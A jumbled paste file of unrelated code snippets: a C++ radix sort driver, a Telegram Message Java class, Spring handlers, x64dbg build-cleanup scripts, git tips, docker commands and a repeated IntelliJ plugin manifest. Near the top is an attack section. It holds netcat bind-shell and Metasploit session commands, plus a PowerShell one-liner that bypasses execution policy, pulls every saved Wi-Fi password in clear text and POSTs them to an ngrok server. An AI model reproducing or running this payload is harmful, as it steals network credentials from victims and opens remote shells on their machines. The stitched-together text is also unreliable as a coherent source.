void print(int arr[], int n) 
{ 
    for (int i = 0; i < n; i++) 
        cout << arr[i] << " "; 
} 
  
// Driver program to test above functions 
int main() 
{ 
    int arr[] = {170, 45, 75, 90, 802, 24, 2, 66}; 
    int n = sizeof(arr)/sizeof(arr[0]); 
    radixsort(arr, n); 
    print(arr, n); 
    return 0; 
} 
-------------------------------------------------------------------------------------------------------
netsh wlan show profiles name="SSID HERE" key=clear
netsh wlan show profiles
msfconsole 
sessions
session -i 1

screen msfconsole -r /path/to/unicorn/unicorn.rc
nc -l -p6996 -e /bin/sh
nc 192.168.1.105 6996


powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Web; $ngrokServer = \"http://SUBDOMAIN.ngrok.io/index.php\"; foreach ($path in [System.IO.Directory]::EnumerateFiles(\"C:\ProgramData\Microsoft\Wlansvc\Profiles\",\"*.xml\",\"AllDirectories\")) { try { $oXml = New-Object System.XML.XMLDocument; $oXml.Load($path); $ssid = $oXml.WLANProfile.SSIDConfig.SSID.Name; $netinfo = netsh.exe wlan show profiles name=\"$ssid\" key=clear; $pass = (($netinfo | Select-String -Pattern \"Key Content\") -split \":\")[1].Trim(); $sendData += \"SSID: \" + ($ssid) + \"`n\" + \"PASSWORD: \" + ($pass) + \"`n`n\"; } catch {}}; Invoke-WebRequest -Uri $ngrokServer -Method \"POST\" -Body $sendData;"

Invoke-WebRequest -Uri $ngrokServer -Method 'POST' -Body $sendData;


Add-Type -AssemblyName System.Web;

 

$ngrokServer = "http://SUBDOMAIN.ngrok.io/index.php";

https://img.wonderhowto.com/img/original/72/02/63645737427901/0/636457374279017202.jpg 

foreach ($path in [System.IO.Directory]::EnumerateFiles("C:\ProgramData\Microsoft\Wlansvc\Profiles","*.xml","AllDirectories")) {
try {

    $oXml = New-Object System.XML.XMLDocument;

    $oXml.Load($path);

    $ssid = $oXml.WLANProfile.SSIDConfig.SSID.Name;

    $netinfo = netsh.exe wlan show profiles name="$ssid" key=clear;

    $pass = (($netinfo | Select-String -Pattern "Key Content") -split ":")[1].Trim();
	$sendData += "SSID: " + ($ssid) + "`n" + "PASSWORD: " + ($pass) + "`n`n";
 } catch {}
}

https://null-byte.wonderhowto.com/how-to/android-for-hackers-turn-android-phone-into-hacking-device-without-root-0189649/#jump-step4
https://null-byte.wonderhowto.com/how-to/hack-wpa2-wi-fi-passwords-using-jedi-mind-tricks-usb-dead-drops-0185290/#jump-step9
https://null-byte.wonderhowto.com/how-to/hacks-mr-robot-use-shodan-api-with-python-automate-scans-for-vulnerable-devices-0180975/
-------------------------------------------------------------------------------------------------------
rm -rf *.class

javac TestCalcChain.java
java TestCalcChain
-------------------------------------------------------------------------------------------------------
<idea-plugin>
    <id>design.patterns.plugin</id>
    <name>Design Patterns</name>
    <vendor email="orestes.polyzos@gmail.com" url="https://www.linkedin.com/in/orestes-polyzos/">Orestes Polyzos</vendor>

    <idea-version since-build="172.*" until-build="192.*"/>

    <description>
        <![CDATA[
            <h2>Provides on the fly implementation of various design patterns based on user's code</h2>
            <p>More information can be found <a href="https://github.com/OrPolyzos/design-patterns-plugin">here</a>.</p>
            <h3>Currently supported design patterns</h3>
            <ul>
                <li>Behavioral</li>
                <ul>
                    <li>Strategy</li>
                </ul>
                <li>Creational</li>
                <ul>
                    <li>Builder (Inner)</li>
                    <li>Factory</li>
                    <li>Singleton</li>
                </ul>
            </ul>
        ]]>
    </description>

    <change-notes>
        <![CDATA[
            <ul>
                <li>
                    <strong>2.0.3</strong>
                    <ul>
                        <li>Adds support for IntelliJ IDEA until build '192.*'</li>
                    </ul>
                </li>
            </ul>
        ]]>
    </change-notes>

    <depends>com.intellij.modules.lang</depends>
    <depends>com.intellij.modules.java</depends>
    <depends>com.intellij.modules.ultimate</depends>
    <depends>com.intellij.modules.idea</depends>
    <depends>com.intellij.modules.idea.ultimate</depends>

    <actions>
        <group id="design-patterns-group" text="Design Patterns" popup="true">
            <add-to-group group-id="EditorPopupMenu" anchor="first"/>
        </group>
        <action id="builderDesignPattern" class="ore.plugins.idea.design.patterns.action.BuilderAction"
                text="Builder"
                description="Implements builder design pattern">
            <add-to-group group-id="design-patterns-group" anchor="first"/>
        </action>
        <action id="singletonDesignPattern" class="ore.plugins.idea.design.patterns.action.SingletonAction"
                text="Singleton"
                description="Implements singleton design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="builderDesignPattern"/>
        </action>
        <action id="strategyDesignPattern" class="ore.plugins.idea.design.patterns.action.StrategyAction"
                text="Strategy"
                description="Implements strategy design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="singletonDesignPattern"/>
        </action>
        <action id="factoryDesignPattern" class="ore.plugins.idea.design.patterns.action.FactoryAction" text="Factory"
                description="Implements factory design pattern">
            <add-to-group group-id="design-patterns-group" anchor="last"/>
        </action>
    </actions>
</idea-plugin>
-------------------------------------------------------------------------------------------------------

import com.fasterxml.jackson.annotation.JsonProperty;

import java.util.Arrays;

/**
 * This class represents a Telegram message.
 */
public class Message
{
	/**
	 * Unique message identifier.
	 */
	@JsonProperty("message_id")
	private int messageId;
	
	/**
	 * Optional. Sender, can be empty for messages sent to channels.
	 */
	@JsonProperty("from")
	private User from;
	
	/**
	 * Date the message was sent in Unix time.
	 */
	@JsonProperty("date")
	private int date;
	
	/**
	 * Conversation the message belongs to.
	 */
	@JsonProperty("chat")
	private Chat chat;
	
	/**
	 * Optional. For forwarded messages, sender of the original message.
	 */
	@JsonProperty("forward_from")
	private User forwardFrom;
	
	/**
	 * Optional. For messages forwarded from a channel, information about
	 * the original channel.
	 */
	@JsonProperty("forward_from_chat")
	private Chat forwardFromChat;
	
	/**
	 * Optional. For forwarded messages, date the original message was sent
	 * in Unix time.
	 */
	@JsonProperty("forward_date")
	private Integer forwardDate;
	
	/**
	 * Optional. For replies, the original message. Note that the Message
	 * object in this field will not contain further reply_to_message fields
	 * even if it itself is a reply.
	 */
	@JsonProperty("reply_to_message")
	private Message replyToMessage;
	
	/**
	 * Optional. Date the message was last edited in Unix time.
	 */
	@JsonProperty("edit_date")
	private int editDate;
	
	/**
	 * Optional. For text messages, the actual UTF-8 text of the message,
	 * 0-4096 characters.
	 */
	@JsonProperty("text")
	private String text;
	
	/**
	 * Optional. For text messages, special entities like usernames, URLs,
	 * bot commands, etc. that appear in the text.
	 */
	@JsonProperty("entities")
	private MessageEntity[] entities;
	
	/**
	 * Optional. Message is an audio file, information about the file.
	 */
	@JsonProperty("audio")
	private Audio audio;
	
	/**
	 * Optional. Message is a general file, information about the file.
	 */
	@JsonProperty("document")
	private Document document;
	
	/**
	 * Optional. Message is a photo, available sizes of the photo.
	 */
	@JsonProperty("photo")
	private PhotoSize[] photo;
	
	/**
	 * Optional. Message is a sticker, information about the sticker.
	 */
	@JsonProperty("sticker")
	private Sticker sticker;
	
	/**
	 * Optional. Message is a video, information about the video.
	 */
	@JsonProperty("video")
	private Video video;
	
	/**
	 * Optional. Message is a voice message, information about the file.
	 */
	@JsonProperty("voice")
	private Voice voice;
	
	/**
	 * Optional. Caption for the photo or video, 0-200 characters.
	 */
	@JsonProperty("caption")
	private String caption;
	
	/**
	 * Optional. Message is a shared contact, information about the contact.
	 */
	@JsonProperty("contact")
	private Contact contact;
	
	/**
	 * Optional. Message is a shared location, information about the location.
	 */
	@JsonProperty("location")
	private Location location;
	
	/**
	 * Optional. Message is a venue, information about the venue.
	 */
	@JsonProperty("venue")
	private Venue venue;
	
	/**
	 * Optional. A new member was added to the group, information about them
	 * (this member may be the bot itself).
	 */
	@JsonProperty("new_chat_member")
	private User newChatMember;
	
	/**
	 * Optional. A member was removed from the group, information about them
	 * (this member may be the bot itself).
	 */
	@JsonProperty("left_chat_member")
	private User leftChatMember;
	
	/**
	 * Optional. A chat title was changed to this value.
	 */
	@JsonProperty("new_chat_title")
	private String newChatTitle;
	
	/**
	 * Optional. A chat photo was change to this value.
	 */
	@JsonProperty("new_chat_photo")
	private PhotoSize[] newChatPhoto;
	
	/**
	 * Optional. Service message: the chat photo was deleted.
	 */
	@JsonProperty("delete_chat_photo")
	private Boolean deleteChatPhoto;
	
	/**
	 * Optional. Service message: the group has been created.
	 */
	@JsonProperty("group_chat_created")
	private Boolean groupChatCreated;
	
	/**
	 * Optional. Service message: the supergroup has been created.
	 * This field can‘t be received in a message coming through updates,
	 * because bot can’t be a member of a supergroup when it is created.
	 * It can only be found in reply_to_message if someone replies to
	 * a very first message in a directly created supergroup.
	 */
	@JsonProperty("supergroup_chat_created")
	private Boolean superGroupChatCreated;
	
	/**
	 * Optional. Service message: the channel has been created. This field
	 * can‘t be received in a message coming through updates, because bot
	 * can’t be a member of a channel when it is created. It can only be
	 * found in reply_to_message if someone replies to a very first message
	 * in a channel.
	 */
	@JsonProperty("channel_chat_created")
	private Boolean channelChatCreated;
	
	/**
	 * Optional. The group has been migrated to a supergroup with the specified
	 * identifier. This number may be greater than 32 bits and some programming
	 * languages may have difficulty/silent defects in interpreting it. But it
	 * smaller than 52 bits, so a signed 64 bit integer or double-precision float
	 * type are safe for storing this identifier.
	 */
	@JsonProperty("migrate_to_chat_id")
	private Long migrateToChatId;
	
	/**
	 * Optional. The supergroup has been migrated from a group with the specified
	 * identifier. This number may be greater than 32 bits and some programming
	 * languages may have difficulty/silent defects in interpreting it. But it
	 * smaller than 52 bits, so a signed 64 bit integer or double-precision float
	 * type are safe for storing this identifier.
	 */
	@JsonProperty("migrate_from_chat_id")
	private Long migrateFromChatId;
	
	/**
	 * Optional. Specified message was pinned. Note that the Message object
	 * in this field will not contain further reply_to_message fields even
	 * if it is itself a reply.
	 */
	@JsonProperty("pinned_message")
	private Message pinnedMessage;
	
	public Message(){}
	
	public Message(int messageId, User from, int date, Chat chat, User forwardFrom, Chat forwardFromChat,
	               Integer forwardDate, Message replyToMessage, int editDate, String text, MessageEntity[] entities,
	               Audio audio, Document document, PhotoSize[] photo, Sticker sticker, Video video, Voice voice,
	               String caption, Contact contact, Location location, Venue venue, User newChatMember,
	               User leftChatMember, String newChatTitle, PhotoSize[] newChatPhoto, Boolean deleteChatPhoto,
	               Boolean groupChatCreated, Boolean superGroupChatCreated, Boolean channelChatCreated,
	               Long migrateToChatId, Long migrateFromChatId, Message pinnedMessage)
	{
		this.messageId = messageId;
		this.from = from;
		this.date = date;
		this.chat = chat;
		this.forwardFrom = forwardFrom;
		this.forwardFromChat = forwardFromChat;
		this.forwardDate = forwardDate;
		this.replyToMessage = replyToMessage;
		this.editDate = editDate;
		this.text = text;
		this.entities = entities;
		this.audio = audio;
		this.document = document;
		this.photo = photo;
		this.sticker = sticker;
		this.video = video;
		this.voice = voice;
		this.caption = caption;
		this.contact = contact;
		this.location = location;
		this.venue = venue;
		this.newChatMember = newChatMember;
		this.leftChatMember = leftChatMember;
		this.newChatTitle = newChatTitle;
		this.newChatPhoto = newChatPhoto;
		this.deleteChatPhoto = deleteChatPhoto;
		this.groupChatCreated = groupChatCreated;
		this.superGroupChatCreated = superGroupChatCreated;
		this.channelChatCreated = channelChatCreated;
		this.migrateToChatId = migrateToChatId;
		this.migrateFromChatId = migrateFromChatId;
		this.pinnedMessage = pinnedMessage;
	}
	
	public int getMessageId(){return messageId;}
	public User getFrom(){return from;}
	public int getDate(){return date;}
	public Chat getChat(){return chat;}
	public User getForwardFrom(){return forwardFrom;}
	public Chat getForwardFromChat(){return forwardFromChat;}
	public Integer getForwardDate(){return forwardDate;}
	public Message getReplyToMessage(){return replyToMessage;}
	public int getEditDate(){return editDate;}
	public String getText(){return text;}
	public MessageEntity[] getEntities(){return entities;}
	public Audio getAudio(){return audio;}
	public Document getDocument(){return document;}
	public PhotoSize[] getPhoto(){return photo;}
	public Sticker getSticker(){return sticker;}
	public Video getVideo(){return video;}
	public Voice getVoice(){return voice;}
	public String getCaption(){return caption;}
	public Contact getContact(){return contact;}
	public Location getLocation(){return location;}
	public Venue getVenue(){return venue;}
	public User getNewChatMember(){return newChatMember;}
	public User getLeftChatMember(){return leftChatMember;}
	public String getNewChatTitle(){return newChatTitle;}
	public PhotoSize[] getNewChatPhoto(){return newChatPhoto;}
	public Boolean getDeleteChatPhoto(){return deleteChatPhoto;}
	public Boolean getGroupChatCreated(){return groupChatCreated;}
	public Boolean getSuperGroupChatCreated(){return superGroupChatCreated;}
	public Boolean getChannelChatCreated(){return channelChatCreated;}
	public Long getMigrateToChatId(){return migrateToChatId;}
	public Long getMigrateFromChatId(){return migrateFromChatId;}
	public Message getPinnedMessage(){return pinnedMessage;}
	
	@Override
	public boolean equals(Object o)
	{
		if(this == o) return true;
		if(!(o instanceof Message)) return false;
		
		Message message = (Message) o;
		
		if(messageId != message.messageId) return false;
		if(date != message.date) return false;
		if(editDate != message.editDate) return false;
		if(from != null ? !from.equals(message.from) : message.from != null) return false;
		if(chat != null ? !chat.equals(message.chat) : message.chat != null) return false;
		if(forwardFrom != null ? !forwardFrom.equals(message.forwardFrom) : message.forwardFrom != null) return false;
		if(forwardFromChat != null ? !forwardFromChat.equals(message.forwardFromChat) : message.forwardFromChat != null)
			return false;
		if(forwardDate != null ? !forwardDate.equals(message.forwardDate) : message.forwardDate != null) return false;
		if(replyToMessage != null ? !replyToMessage.equals(message.replyToMessage) : message.replyToMessage != null)
			return false;
		if(text != null ? !text.equals(message.text) : message.text != null) return false;
		if(!Arrays.deepEquals(entities, message.entities)) return false;
		if(audio != null ? !audio.equals(message.audio) : message.audio != null) return false;
		if(document != null ? !document.equals(message.document) : message.document != null) return false;
		if(!Arrays.deepEquals(photo, message.photo)) return false;
		if(sticker != null ? !sticker.equals(message.sticker) : message.sticker != null) return false;
		if(video != null ? !video.equals(message.video) : message.video != null) return false;
		if(voice != null ? !voice.equals(message.voice) : message.voice != null) return false;
		if(caption != null ? !caption.equals(message.caption) : message.caption != null) return false;
		if(contact != null ? !contact.equals(message.contact) : message.contact != null) return false;
		if(location != null ? !location.equals(message.location) : message.location != null) return false;
		if(venue != null ? !venue.equals(message.venue) : message.venue != null) return false;
		if(newChatMember != null ? !newChatMember.equals(message.newChatMember) : message.newChatMember != null)
			return false;
		if(leftChatMember != null ? !leftChatMember.equals(message.leftChatMember) : message.leftChatMember != null)
			return false;
		if(newChatTitle != null ? !newChatTitle.equals(message.newChatTitle) : message.newChatTitle != null)
			return false;
		if(!Arrays.deepEquals(newChatPhoto, message.newChatPhoto)) return false;
		if(deleteChatPhoto != null ? !deleteChatPhoto.equals(message.deleteChatPhoto) : message.deleteChatPhoto != null)
			return false;
		if(groupChatCreated != null ? !groupChatCreated.equals(message.groupChatCreated)
		                            : message.groupChatCreated != null) return false;
		if(superGroupChatCreated != null ? !superGroupChatCreated.equals(message.superGroupChatCreated)
		                                 : message.superGroupChatCreated != null) return false;
		if(channelChatCreated != null ? !channelChatCreated.equals(message.channelChatCreated)
		                              : message.channelChatCreated != null) return false;
		if(migrateToChatId != null ? !migrateToChatId.equals(message.migrateToChatId) : message.migrateToChatId != null)
			return false;
		if(migrateFromChatId != null ? !migrateFromChatId.equals(message.migrateFromChatId)
		                             : message.migrateFromChatId != null) return false;
		return pinnedMessage != null ? pinnedMessage.equals(message.pinnedMessage) : message.pinnedMessage == null;
		
	}
	
	@Override
	public int hashCode()
	{
		int result = messageId;
		result = 31 * result + (from != null ? from.hashCode() : 0);
		result = 31 * result + date;
		result = 31 * result + (chat != null ? chat.hashCode() : 0);
		result = 31 * result + (forwardFrom != null ? forwardFrom.hashCode() : 0);
		result = 31 * result + (forwardFromChat != null ? forwardFromChat.hashCode() : 0);
		result = 31 * result + (forwardDate != null ? forwardDate.hashCode() : 0);
		result = 31 * result + (replyToMessage != null ? replyToMessage.hashCode() : 0);
		result = 31 * result + editDate;
		result = 31 * result + (text != null ? text.hashCode() : 0);
		result = 31 * result + Arrays.deepHashCode(entities);
		result = 31 * result + (audio != null ? audio.hashCode() : 0);
		result = 31 * result + (document != null ? document.hashCode() : 0);
		result = 31 * result + Arrays.deepHashCode(photo);
		result = 31 * result + (sticker != null ? sticker.hashCode() : 0);
		result = 31 * result + (video != null ? video.hashCode() : 0);
		result = 31 * result + (voice != null ? voice.hashCode() : 0);
		result = 31 * result + (caption != null ? caption.hashCode() : 0);
		result = 31 * result + (contact != null ? contact.hashCode() : 0);
		result = 31 * result + (location != null ? location.hashCode() : 0);
		result = 31 * result + (venue != null ? venue.hashCode() : 0);
		result = 31 * result + (newChatMember != null ? newChatMember.hashCode() : 0);
		result = 31 * result + (leftChatMember != null ? leftChatMember.hashCode() : 0);
		result = 31 * result + (newChatTitle != null ? newChatTitle.hashCode() : 0);
		result = 31 * result + Arrays.deepHashCode(newChatPhoto);
		result = 31 * result + (deleteChatPhoto != null ? deleteChatPhoto.hashCode() : 0);
		result = 31 * result + (groupChatCreated != null ? groupChatCreated.hashCode() : 0);
		result = 31 * result + (superGroupChatCreated != null ? superGroupChatCreated.hashCode() : 0);
		result = 31 * result + (channelChatCreated != null ? channelChatCreated.hashCode() : 0);
		result = 31 * result + (migrateToChatId != null ? migrateToChatId.hashCode() : 0);
		result = 31 * result + (migrateFromChatId != null ? migrateFromChatId.hashCode() : 0);
		result = 31 * result + (pinnedMessage != null ? pinnedMessage.hashCode() : 0);
		return result;
	}
	
	@Override
	public String toString()
	{
		return "Message{" + "messageId=" + messageId + ", from=" + from + ", date=" + date + ", chat=" + chat +
				", forwardFrom=" + forwardFrom + ", forwardFromChat=" + forwardFromChat + ", forwardDate=" +
				forwardDate + ", replyToMessage=" + replyToMessage + ", editDate=" + editDate + ", text='" +
				text + '\'' + ", entities=" + Arrays.deepToString(entities) + ", audio=" + audio + ", document=" +
				document + ", photo=" + Arrays.deepToString(photo) + ", sticker=" + sticker + ", video=" + video +
				", voice=" + voice + ", caption='" + caption + '\'' + ", contact=" + contact + ", location=" +
				location + ", venue=" + venue + ", newChatMember=" + newChatMember + ", leftChatMember=" +
				leftChatMember + ", newChatTitle='" + newChatTitle + '\'' + ", newChatPhoto=" +
				Arrays.deepToString(newChatPhoto) + ", deleteChatPhoto=" + deleteChatPhoto + ", groupChatCreated=" +
				groupChatCreated + ", superGroupChatCreated=" + superGroupChatCreated + ", channelChatCreated=" +
				channelChatCreated + ", migrateToChatId=" + migrateToChatId + ", migrateFromChatId=" +
				migrateFromChatId + ", pinnedMessage=" + pinnedMessage + '}';
	}
}
-------------------------------------------------------------------------------------------------------
@ControllerAdvice
@RestController  
public class ServiceExceptionHandler extends ResponseEntityExceptionHandler
{

    @ExceptionHandler(Exception.class)  
    public final ResponseEntity<java.lang.Object> handleException(Throwable ex,WebRequest req)
    {
        ErrorResponse errorResponse = null;
        if (ex instanceof ApiException)
        {
            errorResponse = new ErrorResponse((ApiException) ex);
        }
        else
        {
            logger.error(ex);
            errorResponse = new ErrorResponse();
            errorResponse.setCode(HttpCodes.HTTP_CODE_500);
            errorResponse.setError(ex.getMessage());
        }
        return new ResponseEntity<Object>(errorResponse,
                HttpStatus.valueOf(errorResponse.getCode()));

    }
    protected ResponseEntity<Object> handleNoHandlerFoundException(NoHandlerFoundException ex,
            HttpHeaders headers, HttpStatus status, WebRequest request)
    {
        Map<String, String> responseBody = new HashMap<String, String>();
        responseBody.put("path", request.getContextPath());
        responseBody.put("message",
                "The URL you have reached is not in service at this time (404).");
        return new ResponseEntity<Object>(responseBody, HttpStatus.NOT_FOUND);
    }
}
-------------------------------------------------------------------------------------------------------
@echo off

echo Cleaning base directory...
del /Q *.sdf
del /Q *.layout
del /Q /A H *.suo
rmdir /S /Q ipch
rmdir /S /Q release
rmdir /S /Q build
rmdir /S /Q cov-int

echo Cleaning BRIDGE...
cd src\bridge
call :delfiles

echo Cleaning DBG...
cd src\dbg
call :delfiles

echo Cleaning EXE...
cd src\exe
call :delfiles

echo Cleaning LAUNCHER...
cd src\launcher
call :delfiles

echo Cleaning GUI SRC...
rmdir /S /Q src\gui_build

echo Cleaning GUI...
cd src/gui
rmdir /S /Q build
del /Q Makefile*
del /Q *.pdb
cd ..\..

echo Cleaning bin\
del /Q bin\*.pdb
del /Q bin\*.exp
del /Q bin\*.a
del /Q bin\*.lib
del /Q bin\*.def
del /Q bin\x96dbg.exe

echo Cleaning bin\x32...
rmdir /S /Q bin\x32\db
del /Q bin\x32\*.pdb
del /Q bin\x32\*.exp
del /Q bin\x32\*.a
del /Q bin\x32\*.lib
del /Q bin\x32\*.def
del /Q bin\x32\x32dbg.exe
del /Q bin\x32\x32dbg.dll
del /Q bin\x32\x32gui.dll
del /Q bin\x32\x32bridge.dll

echo Cleaning bin\x64...
rmdir /S /Q bin\x64\db
del /Q bin\x64\*.pdb
del /Q bin\x64\*.exp
del /Q bin\x64\*.a
del /Q bin\x64\*.lib
del /Q bin\x64\*.def
del /Q bin\x64\x64dbg.exe
del /Q bin\x64\x64dbg.dll
del /Q bin\x64\x64gui.dll
del /Q bin\x64\x64bridge.dll

echo Cleaning help...
cd help
del /Q *.chm
rmdir /S /Q output

echo Done!
exit 0

:delfiles
rmdir /S /Q obj
rmdir /S /Q Win32
rmdir /S /Q x64
del /Q *.bmarks
del /Q *.layout
del /Q *.depend
del /Q *.pdb
cd ..\..








@echo off

if "%OLDPATH%"=="" set OLDPATH=%PATH%

if "%QT32PATH%"=="" set QT32PATH=c:\Qt\qt-5.6.2-x86-msvc2013\5.6\msvc2013\bin
if "%QT64PATH%"=="" set QT64PATH=c:\Qt\qt-5.6.2-x64-msvc2013\5.6\msvc2013_64\bin
if "%QTCREATORPATH%"=="" set QTCREATORPATH=c:\Qt\qtcreator-4.3.1\bin
if "%VSVARSALLPATH%"=="" set VSVARSALLPATH=c:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\vcvarsall.bat
if "%COVERITYPATH%"=="" set COVERITYPATH=c:\coverity\bin

if "%1"=="x32" (
    goto x32
) else if "%1"=="x64" (
    goto x64
) else if "%1"=="coverity" (
    goto coverity
) else (
    echo "Usage: setenv x32/x64/coverity"
    goto :eof
)

:x32
echo Setting Qt in PATH
set PATH=%PATH%;%QT32PATH%
set PATH=%PATH%;%QTCREATORPATH%
echo Setting VS in PATH
call "%VSVARSALLPATH%"
goto :eof

:x64
echo Setting Qt in PATH
set PATH=%PATH%;%QT64PATH%
set PATH=%PATH%;%QTCREATORPATH%
echo Setting VS in PATH
call "%VSVARSALLPATH%" amd64
goto :eof

:coverity
echo Setting Coverity in PATH
set PATH=%PATH%;%COVERITYPATH%
goto :eof
-------------------------------------------------------------------------------------------------------
objdump -D -M intel file.bin | grep main.: -A20
-------------------------------------------------------------------------------------------------------
package com.paragon.microservices.links.model.domain;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonProperty;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.springframework.data.annotation.AccessType;
import org.springframework.data.annotation.Id;
import org.springframework.data.annotation.TypeAlias;
import org.springframework.data.mapping.PersistentProperty;
import org.springframework.data.mapping.PersistentPropertyAccessor;
import org.springframework.validation.annotation.Validated;

import javax.validation.constraints.NotBlank;
import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.NotNull;
import java.io.Serializable;
import java.util.Map;

@Data
@Builder
@Validated
@AllArgsConstructor
@NoArgsConstructor
@TypeAlias("Ticket")
@JsonIgnoreProperties(ignoreUnknown = true)
@JsonInclude(JsonInclude.Include.NON_EMPTY)
public class Ticket implements PersistentPropertyAccessor<Ticket>, Serializable {
    /**
     * Serializable version identifier.
     */
    private static final long serialVersionUID = 6679898674452318620L;

    @Id
    @AccessType(AccessType.Type.PROPERTY)
    @JsonProperty(value = "id", required = true)
    //@JsonDeserialize(using = CustomDateSerializer.class)
    //@JsonSerialize(using = CustomDateSerializer2.class)
    @NotNull(message = "{domain.ticket.id.notNull}")
    private String id;

    @JsonProperty(value = "callBackTopicName", required = true)
    @NotBlank(message = "{domain.ticket.topic-name.notBlank}")
    private String topicName;

    @JsonProperty(value = "callBackMessageType", required = true)
    @NotBlank(message = "{domain.ticket.message-type.notBlank}")
    private String messageType;

    @JsonProperty(value = "details", required = true)
    @NotEmpty(message = "{domain.ticket.details.notEmpty}")
    private Map<String, Object> details;

    @Override
    public void setProperty(PersistentProperty<?> property, Object value) {
        final String str = null;
    }

    @Override
    public Object getProperty(PersistentProperty<?> property) {
        return null;
    }

    @Override
    public Ticket getBean() {
        return null;
    }
}

package com.paragon.microservices.links.system;

import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.UUID;

@Component
public class CustomDateSerializer extends StdDeserializer<UUID> {
    private final ObjectMapper objectMapper;

    @Autowired
    public CustomDateSerializer(final ObjectMapper objectMapper) {
        super(UUID.class);
        this.objectMapper = objectMapper;
    }

    @Override
    public UUID deserialize(final JsonParser jsonparser, final DeserializationContext ctxt) throws IOException {
        final String source = jsonparser.getText();
        return (StringUtils.isNotBlank(source) ? UUID.fromString(source.trim()) : null);
    }
}

package com.paragon.microservices.links.system;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.UUID;

@Component
public class CustomDateSerializer2 extends StdSerializer<UUID> {
    private final ObjectMapper objectMapper;

    @Autowired
    public CustomDateSerializer2(final ObjectMapper objectMapper) {
        super(UUID.class);
        this.objectMapper = objectMapper;
    }

    @Override
    public void serialize(final UUID value, JsonGenerator gen, SerializerProvider arg2) throws IOException {
        gen.writeRaw(this.objectMapper.writeValueAsString(value));
    }

//    @Override
//    public Ticket deserialize(final byte[] bytes) throws SerializationException {
//        if (bytes == null) {
//            return null;
//        }
//        try {
//            return om.readValue(bytes, Ticket.class);
//        } catch (Exception e) {
//            throw new SerializationException(e.getMessage(), e);
//        }
//    }
}


package com.paragon.microservices.links.converter;

import org.apache.commons.lang3.StringUtils;

import java.beans.PropertyEditorSupport;
import java.util.UUID;

import static org.apache.commons.lang3.StringUtils.EMPTY;

public class TicketTypeEditor extends PropertyEditorSupport {

    @Override
    public void setAsText(final String text) {
        final UUID value = (StringUtils.isNotBlank(text) ? UUID.fromString(text.trim()) : null);
        this.setValue(value);
    }

    @Override
    public String getAsText() {
        Object value = this.getValue();
        return (value != null ? value.toString() : EMPTY);
    }
}

    @Bean
    public CustomEditorConfigurer customEditorConfigurer() {
        final CustomEditorConfigurer configurer = new CustomEditorConfigurer();
//        configurer.setPropertyEditorRegistrars(new PropertyEditorRegistrar[]{new CustomPropertyEditorRegistrar()});
        final Map<Class<?>, Class<? extends PropertyEditor>> customEditors = new HashMap<>();
//        customEditors.put(String.class, ExoticTypeEditor.class);
        customEditors.put(Ticket.class, TicketTypeEditor.class);
        configurer.setCustomEditors(customEditors);
        return configurer;
    }
-------------------------------------------------------------------------------------------------------
getClass().getName() + '@' + Integer.toHexString(hashCode())
-------------------------------------------------------------------------------------------------------
git config --global help.autocorrect 1
Add this to your .bash_profile: source ~/.git-completion.bash

git log -S[search term]
git log -Saws_secret_key # did this repo ever have an aws_secret_key?

git log -Saws_secret_key -p

.gitattributes

* filter=trimWhitespace
*.rb filter=trimWhitespace
git config filter.trimWhitespace.clean trim_whitespace

sudo nano trim_whitespace
#!/usr/bin/env ruby
lines = STDIN.readlines
lines.each do |line|
  puts line.rstrip
end

git branch lost_data [SHA1]
git merge lost_data
git fsck --full


-------------------------------------------------------------------------------------------------------
apt-get install node-js
apt-get install build-essentials
apt-get install mermaid
apt-get install mermaid-cli
-------------------------------------------------------------------------------------------------------
qmapshack
-------------------------------------------------------------------------------------------------------

	public int simulate(int[] X, int A) {
        int current = A;
        for (int i = 0; i < X.length; i++) {
            if (X[i] == current) {
                current += X[i];
            }
        }
        return current;
	}
-------------------------------------------------------------------------------------------------------
npm install -g firebase-bolt
npm install -g firebase-tools
firebase deploy
-------------------------------------------------------------------------------------------------------
docker run --rm -it -v ${pwd):/src davidemoro/pytest-play
docker run -d --name graphite --restart=always -p 80:80 -p 2003-2004:2003-2004 -p 2023-2024:2023-2024 -p 8125:8125/udp -p 8126:8126 graphiteapp/graphite-statsd
-------------------------------------------------------------------------------------------------------
gpio -v
gpio readall
-------------------------------------------------------------------------------------------------------
	private static final boolean JAVA_8_IS_PRESENT = ClassUtils.isPresent("java.time.LocalDateTime",
			Jsr310Converters.class.getClassLoader());
-------------------------------------------------------------------------------------------------------
<idea-plugin>
    <id>design.patterns.plugin</id>
    <name>Design Patterns</name>
    <vendor email="orestes.polyzos@gmail.com" url="https://www.linkedin.com/in/orestes-polyzos/">Orestes Polyzos</vendor>

    <idea-version since-build="172.*" until-build="192.*"/>

    <description>
        <![CDATA[
            <h2>Provides on the fly implementation of various design patterns based on user's code</h2>
            <p>More information can be found <a href="https://github.com/OrPolyzos/design-patterns-plugin">here</a>.</p>
            <h3>Currently supported design patterns</h3>
            <ul>
                <li>Behavioral</li>
                <ul>
                    <li>Strategy</li>
                </ul>
                <li>Creational</li>
                <ul>
                    <li>Builder (Inner)</li>
                    <li>Factory</li>
                    <li>Singleton</li>
                </ul>
            </ul>
        ]]>
    </description>

    <change-notes>
        <![CDATA[
            <ul>
                <li>
                    <strong>2.0.3</strong>
                    <ul>
                        <li>Adds support for IntelliJ IDEA until build '192.*'</li>
                    </ul>
                </li>
            </ul>
        ]]>
    </change-notes>
